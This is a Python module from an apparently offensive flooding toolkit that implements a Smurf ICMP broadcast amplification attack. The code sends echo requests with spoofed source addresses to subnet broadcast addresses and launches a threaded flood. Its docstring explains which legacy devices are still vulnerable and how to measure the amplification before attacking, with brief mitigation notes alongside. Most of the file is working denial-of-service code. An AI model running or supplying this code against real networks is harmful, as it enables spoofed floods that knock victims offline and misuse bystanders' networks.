"""
modules/smurf.py - SMURF
Smurf Attack: ICMP echo broadcast amplification.

How it works:
  Mirror of Fraggle but using ICMP echo instead of UDP echo.

  1. Attacker sends ICMP echo request to subnet broadcast
     Source IP = victim_ip (spoofed)
     Destination = broadcast address (e.g. 192.168.1.255)

  2. Every host on the subnet that responds to broadcast pings
     sends ICMP echo reply to victim_ip

  3. Victim receives N responses per packet sent
     N = number of ICMP-responding hosts on the broadcast domain

  Amplification: up to 254x on a /24 subnet

  Modern status:
    - Linux ignores broadcast pings by default (net.ipv4.icmp_echo_ignore_broadcasts=1)
    - Windows ignores broadcast pings since XP SP2
    - Still works on: older embedded devices, some managed switches,
      legacy Cisco IOS without "no ip directed-broadcast",
      some printers and industrial equipment

  Key differences vs Fraggle:
    - ICMP is often less filtered on internal networks than UDP echo
    - ICMP responses are predictable size (same as request + 8 byte header)
    - More likely to pass through internal ACLs on legacy networks

  Cisco IOS mitigation:
    interface <x>
      no ip directed-broadcast   (disabled by default since IOS 12.0)

  Linux mitigation:
    sysctl net.ipv4.icmp_echo_ignore_broadcasts=1   (default=1 on modern distros)

  Finding vulnerable networks:
    ping -b 192.168.1.255          (check how many hosts reply)
    nmap -sn 192.168.1.0/24        (count hosts)
"""

import random
import socket
import struct
import itertools
from floodles.core.packet_builder import random_ip
from floodles.core.sender import FloodEngine

try:
    from scapy.all import IP, ICMP, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def _get_broadcast(network: str) -> str:
    """Derive broadcast from CIDR or return as-is."""
    if "/" not in network:
        return network
    ip_part, prefix = network.split("/")
    prefix = int(prefix)
    ip_int = struct.unpack("!I", socket.inet_aton(ip_part))[0]
    mask   = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
    bcast  = ip_int | (~mask & 0xFFFFFFFF)
    return socket.inet_ntoa(struct.pack("!I", bcast))


def run(
    victim_ip: str,
    broadcast_targets: list[str],
    payload_size: int = 64,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
) -> FloodEngine:
    """
    Launch Smurf ICMP broadcast amplification attack.

    Args:
        victim_ip         : Target IP (spoofed source).
        broadcast_targets : Broadcast addresses or CIDR networks in scope.
                            e.g. ["192.168.1.255", "10.0.0.0/24"]
        payload_size      : ICMP data payload in bytes.
        threads           : Worker count.
        pps_limit         : PPS cap.
        duration          : Duration in seconds.

    Returns:
        FloodEngine (already started).

    Pre-check:
        ping -b <broadcast_ip>
        -> Count how many hosts reply = your amplification factor
        -> If 0 hosts reply, subnet is hardened against Smurf
    """
    if not SCAPY_AVAILABLE:
        raise ImportError("scapy required: pip install scapy")

    broadcasts = [_get_broadcast(t) for t in broadcast_targets]
    bcast_cycle = itertools.cycle(broadcasts)

    def make_packet() -> bytes:
        bcast = next(bcast_cycle)
        pkt = IP(
            src=victim_ip,
            dst=bcast,
        ) / ICMP(
            type=8,   # echo request
            code=0,
            id=random.randint(0, 65535),
            seq=random.randint(0, 65535),
        ) / Raw(load=bytes(
            random.getrandbits(8) for _ in range(payload_size)
        ))
        return bytes(pkt)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=broadcasts[0],
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
